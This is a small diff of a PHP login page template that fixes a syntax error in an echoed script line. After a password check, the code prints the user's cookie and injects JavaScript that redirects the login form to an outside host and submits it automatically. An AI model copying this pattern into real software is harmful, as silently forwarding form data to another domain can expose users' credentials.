@@ -74,7 +74,7 @@ Template Name: Login
               //If the password is correct:
               setUserCookie($phoneNo);
               echo "Cookie value is: " .$_COOKIE['user'];
-              echo C"<script>document.getElementById('loginForm').action = 'https://mr.1221s.com/badge/'</script>";
+              echo "<script>document.getElementById('loginForm').action = 'https://mr.1221s.com/badge/'</script>";
               echo "<script>window.onload= function(){document.getElementById('loginForm').submit();};</script>";
               echo "login success";
             }
